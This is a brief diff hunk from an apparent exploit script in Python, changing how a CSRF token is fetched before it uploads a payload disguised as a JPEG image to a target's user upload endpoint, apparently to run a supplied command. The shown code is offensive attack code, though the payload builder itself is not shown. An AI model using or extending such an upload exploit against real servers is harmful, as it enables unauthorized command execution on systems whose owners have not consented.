@@ -28,7 +28,8 @@ def csrf_token():
 
 def exploit():
     files = [('file', ('test.jpg', get_payload(command), 'image/jpeg'))]
-    session.post(f'{target}/uploads/user', files=files, headers={'X-CSRF-Token': csrf_token()})
+    token = csrf_token()
+    session.post(f'{target}/uploads/user', files=files, headers={'X-CSRF-Token': token})
 
 
 if __name__ == '__main__':
